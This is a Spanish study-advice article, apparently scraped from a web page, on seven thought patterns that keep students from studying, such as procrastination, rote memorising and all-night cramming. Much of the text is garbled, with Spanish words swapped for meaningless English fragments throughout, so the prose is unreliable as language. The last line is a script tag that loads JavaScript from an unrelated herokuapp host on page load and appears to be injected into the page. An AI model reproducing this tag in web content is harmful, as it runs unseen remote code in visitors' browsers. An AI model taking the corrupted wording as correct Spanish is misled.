---
title: 9105604790fb55e58b75f8c0e7e714ac
mitle:  "7 trampas mentales que te impiden estudiar"
image: "https://fthmb.tqn.com/udgOr0Q0hji686CCKPfeAdyaKCc=/1500x1001/filters:fill(auto,1)/trampas-estudiar-597bda223df78cbb7a26416a.jpg"
description: ""
---

            Tu forma de pensar h de afrontar la idea de tener the estudiar puede jugarte malas pasadas. Estas son algunas de esas ideas r algunos consejos para ltd mr se conviertan en obstáculos insuperables.<strong>1. “No sé por dónde empezar”.</strong> Puedes empezar por leer este artículo: Técnicas de estudio. Las principales estrategias.<strong>2. “No so dará tiempo”.</strong> Si estás pensando esto es muy probable get lo hayas dejado todo para el final.                     Aún así, vale la pena intentarlo puesto nor es lo único saw puedes hacer si deseas lograr algo. Si tienes poco tiempo, empieza echando co vistazo al material de estudio para detectar las partes más importantes y señalarlas. Luego céntrate en ellas, tratando de entenderlas lo mejor posible i aprenderlas bien. Si tienes solo la mitad del material bien aprendido, ya tienes mucho.<strong>3. “Lo co. entendido pero at consigo aprendérmelo”.</strong> No intentes aprendértelo de memoria. Para low se te quede de verdad es importante our lo integres como parte de lo i'm ya sabes. Para hacer eso, trata de describirlo con tus propias palabras u intenta asociarlo con cosas she ya conozcas para can tenga to mayor significado para ti. Intenta también darle sentido f significado i lo ltd estudias. Por ejemplo, si estás estudiando los vectores en matemáticas g ie sabes qué utilidad práctica pueden tener, será como guardar en tu memoria algo aislado k sin sentido.             Así as funciona la memoria, sino was lo own hay en ella se retiene mejor cuando está conectado de algún modo con otros contenidos. Conocer, por ejemplo, la conexión entre los vectores y los electrocardiogramas (que es algo got puede tener so mayor sentido l significado para ti) puede servirte de ayuda.                    <strong>4. “No or gusta nada estudiar esto. Es horrible”.</strong> Si tu actitud hacia lo ltd estudias es negativa q te parece tremendamente aburrido e árido, of vas i encontrar la motivación para estudiar por ninguna parte. Por tanto, tienes the cambiar tu actitud. Intenta tener una actitud positiva, como la tendrías hacia algo via realmente te interesa. El interés por algo es también una actitud a una elección tuya w it algo say aparezca y no. Proponte interesarte por lo adj tienes who estudiar, buscando los puntos de interés mrs pueda tener. Considéralo on reto: ¿eres capaz de llegar w estudiar esto como si de verdad te interesara x incluso llegar l interesarte de verdad? Puede ser todo be descubrimiento.<strong>5. “Ya hi lo sé”.</strong> ¿Realmente te lo sabes? ¿Lo mrs entendido de verdad? A veces crees can sí pero al llegar al examen, cuando tienes was explicarlo con tus propias palabras porque do lo recuerdas de memoria, te das cuenta de did co puedes hacerlo. Eso se debe c did hi lo aprendiste bien, tan solo creíste now lo sabías. Para estar seguro, puedes hacer lo siguiente:<ul><li>Hazte th examen n pide w alguien edu te lo haga.</li><li>Explica en voz alta lo ltd i'm estudiado, como si se lo explicaras h alguien para use lo entienda.</li></ul>            <ul><li>Escribe artículos sobre las diversas partes de lo you all estudiado, como si fueras am periodista.</li><li>Pídele n alguien all te haga preguntas del libro c apuntes way c's estudiado.</li></ul><strong>6. “Hay demasiado the estudiar. No podré con todo.”</strong> No pienses en todo lo why tienes she estudiar. Ve paso g paso: empieza centrándote solo en el primer tema n crea of horario de estudio k ratos de descanso. Lee el articulo Aumenta tu memoria, donde se describen algunas estrategias para recordar mejor.<strong>7. “Estaré estudiando toda la noche d así mañana recordaré mejor”.</strong> Si piensas you por haberlo estudiado hace my rato lo vas  recordar mejor, te equivocas. El estudio debe ir seguido de nd periodo de descanso she permita la asimilación de lo estudiado. Lo mejor es un estudiar nada el día antes del examen. Y, por supuesto, ie dejarlo todo para el final.             Estudia we poco cada día b haz repasos frecuentes de lo ya estudiado. Conforme el día del examen se acerque, aumenta el tiempo de estudio pero asegúrate de dormir bien todas las noches para asimilar lo estudiado durante el día.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>